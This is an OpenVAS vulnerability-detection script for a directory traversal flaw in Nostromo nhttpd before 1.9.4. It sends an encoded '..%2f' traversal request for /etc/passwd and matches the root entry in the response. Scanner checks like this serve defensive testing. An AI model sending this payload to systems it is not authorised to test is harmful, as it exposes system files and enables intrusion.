###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nostromo_nhttpd_web_server_dir_trav_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Nostromo nhttpd Webserver Directory Traversal Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "Nostromo nhttpd Version prior to 1.9.4";
tag_insight = "The flaw is due to an error in validating '%2f..' sequences in the
  URI causing attackers to read arbitrary files.";
tag_solution = "Upgrade to Nostromo nhttpd to 1.9.4 or later,
  For updates refer to http://www.nazgul.ch/dev_nostromo.html";
tag_summary = "The host is running Nostromo nhttpd web server and is prone to
  directory traversal vulnerability.";

if(description)
{
  script_id(802010);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-03-22 08:43:18 +0100 (Tue, 22 Mar 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Nostromo nhttpd Webserver Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/517026/100/0/threaded");
  script_xref(name : "URL" , value : "http://www.redteam-pentesting.de/en/advisories/rt-sa-2011-001/-nostromo-nhttpd-directory-traversal-leading-to-arbitrary-command-execution");

  script_description(desc);
  script_summary("Check for directory traversal vulnerability in Nostromo nhttpd Web Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80, 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: nostromo" >!< banner) {
  exit(0);
}

## Iterate Over Possible Attack Requests
path = "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd";

## Construct Directory Traversal Attack
req = http_get(item:path, port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Check for patterns present in /etc/passwd file in the response
if(egrep(pattern:".*root:.*:0:[01]:.*", string:res)){
  security_warning(port);
}

